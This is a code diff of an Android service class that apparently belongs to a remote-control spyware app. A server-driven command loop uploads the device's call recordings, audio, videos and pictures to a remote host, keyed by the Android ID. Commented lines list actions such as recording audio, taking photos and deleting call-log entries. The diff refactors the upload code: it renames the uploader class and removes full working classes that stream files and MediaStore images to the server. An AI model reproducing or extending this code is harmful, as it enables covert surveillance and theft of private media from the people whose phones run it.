@@ -11,26 +11,18 @@ import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.Calendar;
 import java.util.List;
 import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.Service;
 import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageManager;
-import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -45,8 +37,6 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.StrictMode;
 import android.preference.PreferenceManager;
-import android.provider.Browser;
-import android.provider.MediaStore;
 import android.provider.Settings.Secure;
 import android.telephony.TelephonyManager;
 import android.util.Base64;
@@ -57,6 +47,7 @@ import com.utils.NetWorkUtils;
 import com.asynctask.*;
 
 import static com.utils.CommonUtils.getInputStreamFromUrl;
+import static com.utils.CommonUtils.removeBlankSpace;
 
 public class MyService extends Service {
     //********************************************************************************************************************************************************
@@ -365,18 +356,18 @@ public class MyService extends Service {
                                 new promptUninstall().execute("");
                             } else if (line.contains("uploadfiles(")) {
                                 if (list.get(0).equals("default")) {
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                 } else if (list.get(0).equals("Calls" + File.separator)) {
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                 } else if (list.get(0).equals("Audio")) {
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                 } else if (list.get(0).equals("Videos")) {
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                 } else if (list.get(0).equals("Pictures")) {
-                                    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+                                    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
                                 }
                             } else if (line.contains("changedirectory(")) {
                                 new changeDirectory().execute();
@@ -474,7 +465,7 @@ public class MyService extends Service {
 
 //		            new recordAudio("20000").execute("");
 //		    		new takePhoto("0").execute("");
-//		            new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+//		            new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
 //			        new mediaVolumeUp().execute("");
 //			        new mediaVolumeDown().execute("");
 //			        new ringerVolumeUp().execute("");
@@ -492,10 +483,10 @@ public class MyService extends Service {
 //		    		new deleteCallLogNumber("1231231234").execute();
 //					new openWebpage("http://google.com").execute("");
 //					new promptUninstall().execute("");
-//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-//				    new UploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Calls" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Audio" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
+//				    new uploadFiles(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Pictures" + File.separator, urlUploadFiles + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
 //					new changeDirectory().execute();
 //					new deleteFiles("Audio").execute("");
 //				    new deleteFiles("Videos").execute("");
@@ -534,7 +525,6 @@ public class MyService extends Service {
             longitude = location.getLongitude();
         }
     }
-
     //********************************************************************************************************************************************************
     private final LocationListener locationListener = new LocationListener() {
         public void onLocationChanged(Location location) {
@@ -551,287 +541,6 @@ public class MyService extends Service {
         public void onStatusChanged(String provider, int status, Bundle extras) {
         }
     };
-    //********************************************************************************************************************************************************
-    private class UploadFiles extends AsyncTask<String, Void, String> {
-        String j = "";
-        String i = "";
-
-        public UploadFiles(String j, String i) {
-            this.j = j;
-            this.i = i;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-
-            File sd = new File(j);
-            if (sd.exists()) {
-                File[] sdDirList = sd.listFiles();
-                for (int k = 0; k < sdDirList.length; k++) {
-                    try {
-                        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString());
-                    } catch (UnsupportedEncodingException e) {
-
-                        e.printStackTrace();
-                    }
-
-                    HttpURLConnection connection = null;
-                    DataOutputStream outputStream = null;
-                    DataInputStream inputStream = null;
-
-                    String pathToOurFile = sdDirList[k].toString();
-                    String urlServer = URL + i;
-
-                    Log.i("com.connect", "pathToOurFile : " + pathToOurFile);
-                    Log.i("com.connect", "urlServer : " + urlServer);
-
-
-                    String lineEnd = "\r\n";
-                    String twoHyphens = "--";
-                    String boundary = "*****";
-                    int bytesRead, bytesAvailable, bufferSize;
-                    byte[] buffer;
-                    int maxBufferSize = 1 * 1024 * 1024 * 1000 * 10;
-
-                    try {
-                        FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
-
-                        URL url = new URL(urlServer);
-                        connection = (HttpURLConnection) url.openConnection();
-
-                        // Allow Inputs & Outputs
-                        connection.setDoInput(true);
-                        connection.setDoOutput(true);
-                        connection.setUseCaches(false);
-
-                        // Enable POST method
-                        connection.setRequestMethod("POST");
-
-                        connection.setRequestProperty("Connection", "Keep-Alive");
-                        connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-
-                        outputStream = new DataOutputStream(connection.getOutputStream());
-                        outputStream.writeBytes(twoHyphens + boundary + lineEnd);
-                        outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile + "\"" + lineEnd);
-                        outputStream.writeBytes(lineEnd);
-
-                        bytesAvailable = fileInputStream.available();
-                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                        buffer = new byte[bufferSize];
-
-                        // Read file
-                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-
-                        while (bytesRead > 0) {
-                            outputStream.write(buffer, 0, bufferSize);
-                            bytesAvailable = fileInputStream.available();
-                            bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-                        }
-
-                        outputStream.writeBytes(lineEnd);
-                        outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-
-                        // Responses from the server (code and message)
-                        int serverResponseCode = connection.getResponseCode();
-                        String serverResponseMessage = connection.getResponseMessage();
-                        fileInputStream.close();
-                        outputStream.flush();
-                        outputStream.close();
-                        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");
-                    } catch (Exception ex) {
-                        ex.printStackTrace();
-                    }
-                }
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-            try {
-                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files", false).commit();
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Files Uploaded");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onPreExecute() {
-            try {
-                while (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getBoolean("Files", false) == true) {
-                    try {
-                        Thread.sleep(5000);
-                    } catch (InterruptedException e) {
-                        e.printStackTrace();
-                    }
-                }
-                PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Files", true).commit();
-                getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading Files");
-            } catch (UnsupportedEncodingException e) {
-
-                e.printStackTrace();
-            }
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-    //********************************************************************************************************************************************************
-    public class uploadPictures extends AsyncTask<String, Void, String> {
-        String i = "";
-        String j = "";
-        String k = "";
-
-        public uploadPictures(String i, String j, String k) {
-            this.i = i;
-            this.j = j;
-            this.k = k;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-
-            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-            String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.BUCKET_ID,
-                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE};
-            Log.i("com.connect", "Pictures started");
-
-            Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
-            if (cursor != null) {
-                while (cursor.moveToNext()) {
-//		            if(Integer.parseInt(i)<Integer.parseInt(cursor.getString(5)) && Integer.parseInt(j)>Integer.parseInt(cursor.getString(5)) && Integer.parseInt(k) > (Integer.parseInt(cursor.getString(7))/1024^2))
-//		            {
-                    new uploadFile(cursor.getString(3), urlUploadPictures + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Password=" + password).execute("");
-//		            }
-                }
-            }
-            cursor.close();
-            Log.i("com.connect", "Pictures done");
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {/*httpcalldone*/}
-
-        @Override
-        protected void onPreExecute() {/*httpcallexecuting*/}
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
-    static String removeBlankSpace(StringBuilder sb) {
-        int j = 0;
-        for (int i = 0; i < sb.length(); i++) {
-            if (!Character.isWhitespace(sb.charAt(i))) {
-                sb.setCharAt(j++, sb.charAt(i));
-            }
-        }
-        sb.delete(j, sb.length());
-        return sb.toString();
-    }
-    //********************************************************************************************************************************************************
-    private class uploadFile extends AsyncTask<String, Void, String> {
-        String j = "";
-        String i = "";
-
-        public uploadFile(String j, String i) {
-            this.j = j;
-            this.i = i;
-        }
-
-        @Override
-        protected String doInBackground(String... params) {
-
-            File sd = new File(j);
-            if (sd.exists()) {
-                HttpURLConnection connection = null;
-                DataOutputStream outputStream = null;
-                DataInputStream inputStream = null;
-
-                String pathToOurFile = j;
-                String urlServer = URL + i;
-
-                Log.i("com.connect", "pathToOurFile : " + pathToOurFile);
-                Log.i("com.connect", "urlServer : " + urlServer);
-
-
-                String lineEnd = "\r\n";
-                String twoHyphens = "--";
-                String boundary = "*****";
-                int bytesRead, bytesAvailable, bufferSize;
-                byte[] buffer;
-                int maxBufferSize = 1 * 1024 * 1024 * 1000 * 10;
-
-                try {
-                    FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
-
-                    URL url = new URL(urlServer);
-                    connection = (HttpURLConnection) url.openConnection();
-
-                    // Allow Inputs & Outputs
-                    connection.setDoInput(true);
-                    connection.setDoOutput(true);
-                    connection.setUseCaches(false);
-
-                    // Enable POST method
-                    connection.setRequestMethod("POST");
-
-                    connection.setRequestProperty("Connection", "Keep-Alive");
-                    connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-
-                    outputStream = new DataOutputStream(connection.getOutputStream());
-                    outputStream.writeBytes(twoHyphens + boundary + lineEnd);
-                    outputStream.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + pathToOurFile + "\"" + lineEnd);
-                    outputStream.writeBytes(lineEnd);
-
-                    bytesAvailable = fileInputStream.available();
-                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                    buffer = new byte[bufferSize];
-
-                    // Read file
-                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-
-                    while (bytesRead > 0) {
-                        outputStream.write(buffer, 0, bufferSize);
-                        bytesAvailable = fileInputStream.available();
-                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
-                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
-                    }
-
-                    outputStream.writeBytes(lineEnd);
-                    outputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
-
-                    // Responses from the server (code and message)
-                    int serverResponseCode = connection.getResponseCode();
-                    String serverResponseMessage = connection.getResponseMessage();
-                    fileInputStream.close();
-                    outputStream.flush();
-                    outputStream.close();
-//				        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Uploading:" + sdDirList[k].toString() + " Complete");       
-                } catch (Exception ex) {
-                    ex.printStackTrace();
-                }
-            }
-            return "Executed";
-        }
-
-        @Override
-        protected void onPostExecute(String result) {
-        }
-
-        @Override
-        protected void onPreExecute() {
-        }
-
-        @Override
-        protected void onProgressUpdate(Void... values) {
-        }
-    }
     //********************************************************************************************************************************************************
 //	public class isUrlAlive extends AsyncTask<String, Void, String> {
 //		String i = "";
